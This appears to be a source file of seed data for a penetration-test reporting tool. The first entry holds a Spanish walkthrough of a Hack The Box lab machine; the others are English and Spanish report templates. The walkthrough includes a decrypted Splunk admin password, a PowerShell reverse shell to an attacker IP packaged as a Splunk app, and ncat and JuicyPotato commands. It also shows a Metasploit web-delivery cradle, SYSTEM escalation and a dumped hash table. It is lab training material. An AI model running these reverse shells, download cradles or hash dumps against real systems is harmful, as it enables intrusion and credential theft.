./var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=
./etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==
./etc/system/README/indexes.conf.spec:* Unencrypted access key cannot begin with "$1$" or "$7$". These prefixes are reserved
./etc/system/README/indexes.conf.spec:* Unencrypted secret key cannot begin with "$1$" or "$7$". These prefixes are reserved
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$". This is used by
./etc/system/README/server.conf.spec:    * NOTE: Unencrypted passwords must not begin with "$1$", because this is
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as Splunk software uses
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with "$1$", as this is used by
./lib/node_modules/pdfkit/lib/mixins/color.coffee:                color = color.replace(/#([0-9A-F])([0-9A-F])([0-9A-F])/i, "#$1$1$2$2$3$3") if color.length is 4
\`\`\`

Encontramos un password encriptado en \`authentication.conf\`. Usaremos \`splunksecrets\` para crackearl&#x6F;**.**

{% hint style="warning" %}
&#x20;**Nota:** Ten en cuenta que el \`secret\` aquí proviene del código de backup.
{% endhint %}

\`\`\`bash
cd etc/auth/splunk.secret

CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B
\`\`\`

\`\`\`
splunksecrets splunk-decrypt -S splunk.secret

Ciphertext: $1$YDz8WfhoCWmf6aTRkA+QqUI=
Sp1unkadmin@2k24
\`\`\`

Tenemos la contraseña en plano, y indica que pertenece a un administrador. SI no ha cambiado la contraseña posiblemente podamos acceder a través de la aplicación de Splunk en producción.

### Acceso a Splunk

![Captura](image://img-haze-08)

Estamos dentro! Vamos a seguir los pasos de la sección dedicada:

{% content-ref url="/pages/H2giMOv83Oxks219O7GX" %}
[Splunk - Ataques](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/ataques-a-herramientas-de-monitorizacion/splunk-ataques.md)
{% endcontent-ref %}

### Preparación del exploit 

Vamos a usar este repositorio:

[https://github.com/0xjpuff/reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk)

\`\`\`
tree .                 
.
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf
\`\`\`

Este directorio contiene 2 carpetas, una con ejecutables y una con un archivo de configuración.

Editamos \`run.ps1\` para añadir nuestra IP y puerto de atacante:

\`\`\`bash
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.198',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
\`\`\`

También editamos \`inputs.conf\` de la siguiente manera:

\`\`\`python
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\\bin\\run.bat]
disabled = 0
sourcetype = shell
interval = 10

@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
\`\`\`

Una vez guardamos los archivos lo comprimimos con el siguiente comando:

\`\`\`bash
tar -cvzf updater.tar.gz reverse_shell_splunk 

reverse_shell_splunk/
reverse_shell_splunk/default/
reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/bin/
reverse_shell_splunk/bin/rev.py
reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/bin/run.ps1
\`\`\`

### Subida del exploit 

Dentro de \`Apps\` hacemos click en \`Install app from file\`:

![Captura](image://img-haze-09)

Aquí le damos a \`Browse\`, cargamos el archivo \`updater.tar.gz\` y le damos a \`Upload\`:

![Captura](image://img-haze-10)

Antes de darle debemos configurar un listener de Netcat para recibir la conexión, y al darle a Update automátcamente conseguimos la shell!

\`\`\`bash
sudo nc -lnvp 4444

[sudo] contraseña para kali: 
listening on [any] 4444 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.61] 52451

whoami
haze\\alexander.green
\`\`\`

Tenemos una shell con el usuario alexander.green, vamos a ver información del usuario y sus permisos:

\`\`\`bash
PS C:\\Windows\\system32> whoami /all

USER INFORMATION
----------------

User Name            SID                                        
==================== ===========================================
haze\\alexander.green S-1-5-21-323145914-28650650-2368316563-1106

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                         Attributes                                        
========================================== ================ =========================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\\Users                              Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\\Certificate Service DCOM Access    Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\SERVICE                       Well-known group S-1-5-6                                     Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\Authenticated Users           Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\\This Organization             Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group
HAZE\\Splunk_Admins                         Group            S-1-5-21-323145914-28650650-2368316563-1108 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\\High Mandatory Level       Label            S-1-16-12288                                                                                  

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
\`\`\`

Tenemos \`SeImpersonatePrivilege\` habilitado. Podemos consultar la siguiente sección para explotarlo:

{% content-ref url="/pages/Rhex9oM8nSXsZW4WoQgS" %}
[SeImpersonate y SeAssignPrimaryToken](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/privilegios-de-usuario-en-windows/seimpersonate-y-seassignprimarytoken.md)
{% endcontent-ref %}

También vemos que pertenece al grupo \`HAZE\\Splunk_Admins\`, por lo que si conseguimos un Meterpreter sería muy fácil escalar privilegios a SYSTEM con \`getsystem\`.

### Aumentar privilegios con JuicyPotato

[https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

Enviamos el \`JuicyPotato.exe\` y un [binario estático de Netcat](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows/x86) a la máquina:

\`\`\`shell-session
afsh4ck@kali$ python3 -m http.server 80
\`\`\`

\`\`\`powershell
PS C:\\Users\\Public\\Documents> wget http://10.10.14.198/JuicyPotato.exe -o JuicyPotato.exe
PS C:\\Users\\Public\\Documents> wget http://10.10.14.198/ncat.exe -o ncat.exe
PS C:\\Users\\Public\\Documents> dir

    Directory: C:\\Users\\Public\\Documents

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          5/8/2025   5:56 PM         347648 JuicyPotato.exe
-a----          5/8/2025   5:57 PM         174664 ncat.exe   
\`\`\`

Y lo ejecutamos de la siguiente manera:

\`\`\`
PS C:\\Tools> ./JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\tools\\ncat.exe 10.10.14.198 4444 -e cmd.exe" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
COM -> recv failed with error: 10038
\`\`\`

El error 10038 significa literalmente: **“El descriptor no es un socket.”** En el contexto de JuicyPotato, suele indicar que:

1. El \`CLSID\` usado no es válido o no permite activación con el token actual.
2. El puerto especificado (\`-l 53375\`) no está abierto o en uso.
3. No se puede establecer comunicación con el COM Server adecuado.

Como el [proceso de conseguir CLSIDs válidos](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-windows/escalada-de-privilegios-en-windows-skills-assessment/escenario-1#conseguir-clsids-validos) es un tanto extenso, vamos a optar por conseguir un Meterpreter y elevar a \`SYSTEM\` para hacer un hashdump.

### Meterpreter Webdelivery 

Configura un Powershell web delivery escuchando en el puerto 8080.

\`\`\`bash
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 2; set payload windows/x64/meterpreter/reverse_http; set LHOST 10.10.14.198; set LPORT 4443; run"

[*] Using configured payload python/meterpreter/reverse_tcp
TARGET => 2
payload => windows/x64/meterpreter/reverse_http
LHOST => 10.10.14.198
LPORT => 4443

[*] Started HTTP reverse handler on http://10.10.14.198:4443
[*] Using URL: http://10.10.14.198:1234/piiQqyvVY4yPq
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABsADIAMABxAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGwAMgAwAHEALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABsADIAMABxAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADgAOgAxADIAMwA0AC8AcABpAGkAUQBxAHkAdgBWAFkANAB5AFAAcQAvAEgANgBVAE0AagBNADgAWAB6ADIAaQAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADgAOgAxADIAMwA0AC8AcABpAGkAUQBxAHkAdgBWAFkANAB5AFAAcQAnACkAKQA7AA==
\`\`\`

**Ejecutar el comando en la máquina objetivo**

\`\`\`powershell
PS C:\\windows\\system32\\inetsrv> powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemW
\`\`\`

**Recibiendo el Meterpreter**

\`\`\`bash
[*] 10.10.11.61      web_delivery - Delivering AMSI Bypass (1393 bytes)
[*] 10.10.11.61      web_delivery - Delivering Payload (4111 bytes)
[!] http://10.10.14.198:4443 handling request from 10.10.11.61; (UUID: h1cqnx6f) Without a database connected that payload UUID tracking will not work!
[*] http://10.10.14.198:4443 handling request from 10.10.11.61; (UUID: h1cqnx6f) Staging x64 payload (204892 bytes) ...
[!] http://10.10.14.198:4443 handling request from 10.10.11.61; (UUID: h1cqnx6f) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.198:4443 -> 10.10.11.61:53173) at 2025-05-09 00:25:07 +0200

msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x64/windows  HAZE\\alexander.green @ DC01  10.10.14.198:4443 -> 10.10.11.61:53173 (10.10.11.61)
\`\`\`

\`\`\`bash
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: HAZE\\alexander.green
\`\`\`

### Consiguiendo SYSTEM

\`\`\`bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM
\`\`\`

### Acceso a la flag

\`\`\`bash
meterpreter > dir
Listing: c:\\Users\\Administrator\\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2025-03-05 08:00:53 +0100  desktop.ini
100444/r--r--r--  34    fil   2025-05-08 14:01:44 +0200  root.txt

meterpreter > cat root.txt
805b5e58b6c62757b2c81e**********
\`\`\`

### Extra: Hashdump

\`\`\`
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:06dc954d32cb91ac2831d67e3e12027f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:937e28202a6cdfcc556d1b677bcbe82c:::
paul.taylor:1103:aad3b435b51404eeaad3b435b51404ee:e90878e2fb0a21a11859ff60f1119fb4:::
mark.adams:1104:aad3b435b51404eeaad3b435b51404ee:e90878e2fb0a21a11859ff60f1119fb4:::
edward.martin:1105:aad3b435b51404eeaad3b435b51404ee:09e0b3eeb2e7a6b0d419e9ff8f4d91af:::
alexander.green:1106:aad3b435b51404eeaad3b435b51404ee:6b8caa0cd4f8cb8ddf2b5677a24cc510:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9dcbc33adec3bdc8b2334060002ce1b4:::
Haze-IT-Backup$:1111:aad3b435b51404eeaad3b435b51404ee:84d6a733d85d9e03f46eba25b34517a9:::
\`\`\`

Y ya habríamos comprometido totalmente la máquina!`,
    startDate: '2026-09-01',
    endDate: '2026-09-01',
    status: 'Completed',
    language: 'es',
    createdAt: formatISO(sub(now, { weeks: 1 })),
    updatedAt: formatISO(sub(now, { weeks: 1 })),
    icon: 'FileText',
  },
  {
    id: 'proj-htb-cpts',
    clientId: 'cli-trilocor',
    name: 'CPTS Report',
    reportBody: `# Executive Summary

{{client.name}} contracted {{pentester.name}} to perform a penetration test of {{client.name}}'s network to identify security weaknesses, determine the impact to {{client.name}}, document all findings in a clear and repeatable manner, and provide remediation recommendations.

This report is submitted as part of the **[TODO: Certification Name]** certification exam and documents the assessment methodology, the attack path taken to compromise the target environment, and the findings identified along the way.

# Approach

{{pentester.name}} performed testing under a **[TODO: Black Box / Grey Box / White Box]** approach from {{project.startDate}} to {{project.endDate}} without advance knowledge of {{client.name}}'s environment, with the goal of identifying unknown weaknesses. Testing was performed from a non-evasive standpoint with the goal of uncovering as many misconfigurations and vulnerabilities as possible.

Each weakness identified was documented and manually investigated to determine exploitation possibilities and escalation potential. {{pentester.name}} sought to demonstrate the full impact of every vulnerability, up to and including full domain compromise. Where a foothold was obtained, further testing including lateral movement and horizontal and vertical privilege escalation was performed to demonstrate the impact of an internal network compromise.

# Scope

The scope of this assessment was the target network range(s) assigned for the exam and any hosts or Active Directory domains discovered to be in scope during testing.

## In Scope Assets

| Host / URL / IP Address | Description |
|:---|:---|
| [TODO: 10.129.X.X] | [TODO: External target] |
| [TODO: 172.16.X.0/24] | [TODO: Internal network range] |
| [TODO: domain.local] | [TODO: Active Directory domain] |

# Assessment Overview and Recommendations

During the penetration test against {{client.name}}, {{pentester.name}} identified {{vulnerabilities.count}} findings that threaten the confidentiality, integrity, and availability of {{client.name}}'s information systems. The findings were categorized by severity level: {{vulnerabilities.critical}} critical, {{vulnerabilities.high}} high, {{vulnerabilities.medium}} medium, {{vulnerabilities.low}} low, and {{vulnerabilities.informational}} informational.

[TODO: Executive-level narrative summarizing the overall security posture, the most significant risks, and their business impact.]

{{client.name}} should create a remediation plan based on the Remediation Summary section of this report, addressing all critical and high findings as soon as possible according to the needs of the business. {{client.name}} should also consider performing periodic vulnerability assessments if they are not already being performed.

# Network Penetration Test Assessment Summary

This section summarizes the testing perspective and the findings identified during the network penetration test.

## Network Summary

{{pentester.name}} began all testing activities from the perspective of an unauthenticated user on the network. {{client.name}} provided network ranges but did not provide additional information such as operating system, credentials, or configuration details.

## Summary of Findings

During the course of testing, {{pentester.name}} uncovered a total of {{vulnerabilities.count}} findings that pose a material risk to {{client.name}}'s information systems. Informational findings are observations for areas of improvement and do not represent security vulnerabilities on their own. The table below summarizes the findings; full technical details for each are provided in the Technical Findings Details section.

{{findings.table}}

# Technical Findings Details

The findings below are ordered by severity. Each finding includes a description, evidence, impact, and remediation guidance. If no findings are registered yet, this section will be empty.

{{findings.details}}

# Internal Network Compromise Walkthrough

This section describes the end-to-end attack path used to compromise the environment.

## Walkthrough Summary

During the assessment {{pentester.name}} was able to gain a foothold, move laterally, and compromise the environment, leading to full administrative control over the [TODO: domain.local] domain. The steps below demonstrate the path taken from initial access to compromise and do not include every vulnerability discovered. Issues not used as part of the path to compromise are listed as standalone findings in the Findings section, ranked by severity.

## Detailed Walkthrough

{{pentester.name}} performed the following to fully compromise the [TODO: domain.local] domain:

1. [TODO: High-level step 1]
2. [TODO: High-level step 2]
3. [TODO: High-level step 3]

**Detailed reproduction steps:**

[TODO: Fill in the detailed attack chain with commands, screenshots, and evidence for each step above.]

# Remediation Summary

As a result of this assessment there are several opportunities for {{client.name}} to strengthen its network security. Remediation efforts are prioritized below, starting with those that will likely take the least amount of time and effort to complete. All remediation steps should be carefully planned and tested to prevent service disruption or data loss.

## Short Term

- [TODO: Finding reference] - [TODO: Short-term remediation action]
- [TODO: Finding reference] - [TODO: Short-term remediation action]

## Medium Term

- [TODO: Finding reference] - [TODO: Medium-term remediation action]
- [TODO: Finding reference] - [TODO: Medium-term remediation action]

## Long Term

- Perform ongoing internal network vulnerability assessments and password audits.
- Perform periodic Active Directory security assessments.
- Educate systems, network administrators, and developers on security hardening best practices.
- Enhance network segmentation to isolate critical hosts and limit the effect of an internal compromise.
- [TODO: Additional long-term recommendation]

# Appendix

The following supporting information was collected during the assessment.

## Finding Severities

Each finding is assigned a severity rating of critical, high, medium, low, or informational. The rating is based on the priority with which each finding should be addressed and the potential impact each has on the confidentiality, integrity, and availability of {{client.name}}'s data.

| Rating | CVSS Score Range |
|:---|:---|
| Critical | 9.0 – 10.0 |
| High | 7.0 – 8.9 |
| Medium | 4.0 – 6.9 |
| Low | 0.1 – 3.9 |
| Informational | 0.0 |

## Host and Service Discovery

| IP Address | Port | Service | Notes |
|:---|:---|:---|:---|
| [TODO: IP] | [TODO: Port] | [TODO: Service] | [TODO: Notes] |

## Subdomain Discovery

| URL | Description | Discovery Method |
|:---|:---|:---|
| [TODO: Subdomain or VHost] | [TODO: Description] | [TODO: Method] |

## Exploited Hosts

| Host | Scope | Method | Notes |
|:---|:---|:---|:---|
| [TODO: Host] | [TODO: Scope] | [TODO: Method] | [TODO: Notes] |

## Compromised Users

| Username | Type | Method | Notes |
|:---|:---|:---|:---|
| [TODO: Username] | [TODO: Type] | [TODO: Method] | [TODO: Notes] |

## Changes and Host Cleanup

| Host | Scope | Change or Cleanup Needed |
|:---|:---|:---|
| [TODO: Host] | [TODO: Scope] | [TODO: Change or cleanup performed] |

## Flags Discovered

| Flag # | Host | Flag Value | Flag Location | Method Used |
|:---|:---|:---|:---|:---|
| 1 | [TODO: Hostname] | [TODO: Flag value] | [TODO: Location] | [TODO: Method] |
| 2 | | | | |
| 3 | | | | |
| 4 | | | | |
| 5 | | | | |
| 6 | | | | |
| 7 | | | | |
| 8 | | | | |
| 9 | | | | |
| 10 | | | | |
| 11 | | | | |
| 12 | | | | |
| 13 | | | | |
| 14 | | | | |`,
    startDate: '2026-09-01',
    endDate: '2026-09-10',
    status: 'In Progress',
    language: 'en',
    createdAt: formatISO(sub(now, { days: 10 })),
    updatedAt: formatISO(sub(now, { days: 2 })),
    icon: 'Award',
  },
  {
    id: 'proj-1',
    clientId: 'cli-htb',
    name: 'Q3 Web App Pentest',
    reportBody: `# Executive Summary
This report details the findings of the penetration test conducted on **Q3 Web App Pentest** for **Hack The Box** between 2023-07-01 and 2023-07-15. The assessment identified **2** total vulnerabilities, including **1** critical and **1** high-risk findings. Urgent remediation is recommended for critical vulnerabilities to mitigate potential impact.

---
# Scope & Methodology
The assessment was conducted from the perspective of an external, unauthenticated attacker (black-box).

## Scope
- Web Applications: *.hackthebox.eu, api.hackthebox.eu
- External Network: 138.68.128.0/24

## Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---
# Attack Narrative
The engagement began with reconnaissance against the *.hackthebox.eu domain, which revealed the existence of an outdated blog and a development server with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---
# Findings Classification
| Severity | CVSS v3.1 Score | Description |
|:---|---|:---|
| <span style="color:red">Critical</span> | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise. |
| <span style="color:orange">High</span> | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access. |
| <span style="color:yellow">Medium</span> | 4.0 - 6.9 | Weaknesses that could reveal sensitive information. |
| <span style="color:blue">Low</span> | 0.1 - 3.9 | Minor issues that reduce the overall security posture. |
| <span style="color:gray">Informational</span> | 0.0 | Observations about the external footprint. |
`,
    startDate: '2023-07-01',
    endDate: '2023-07-15',
    status: 'Completed',
    language: 'en',
    createdAt: formatISO(sub(now, { months: 2 })),
    updatedAt: formatISO(sub(now, { months: 1 })),
    icon: 'Scan'
  },
  {
    id: 'proj-2',
    clientId: 'cli-ine',
    name: 'Análisis de Red Interna',
    reportBody: `# Resumen Ejecutivo
Este informe detalla los hallazgos de la evaluación de seguridad de la red interna para **INE Security**, realizada entre el 10-08-2023 y el 20-08-2023. El objetivo era identificar vulnerabilidades explotables desde la perspectiva de un actor malicioso con acceso a la red corporativa. Se descubrieron múltiples debilidades, incluyendo el uso de credenciales por defecto en servicios críticos y software sin parches que permitieron la escalada de privilegios hasta el nivel de Administrador de Dominio. Se recomienda la remediación inmediata de los hallazgos críticos.

---
# Alcance y Metodología
## Alcance
- Rangos IP: 10.10.0.0/16
- Supuestos: La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- Exclusiones: No se realizaron pruebas que pudieran causar una denegación de servicio en sistemas de producción críticos.

## Metodología
1. **Descubrimiento de Activos:** Identificación de hosts activos, puertos y servicios en la red.
2. **Enumeración de Servicios:** Análisis de servicios para identificar versiones, configuraciones y posibles vulnerabilidades.
3. **Explotación y Movimiento Lateral:** Intento de explotar vulnerabilidades para ganar acceso y moverse a través de la red.
4. **Escalada de Privilegios:** Búsqueda de vías para elevar los privilegios en los sistemas comprometidos y en el dominio de Active Directory.
`,
    startDate: '2023-08-10',
    endDate: '2023-08-20',
    status: 'In Progress',
    language: 'es',
    createdAt: '2023-08-10T09:00:00Z',
    updatedAt: formatISO(sub(now, { days: 3 })),
    icon: 'Network'
  },
];
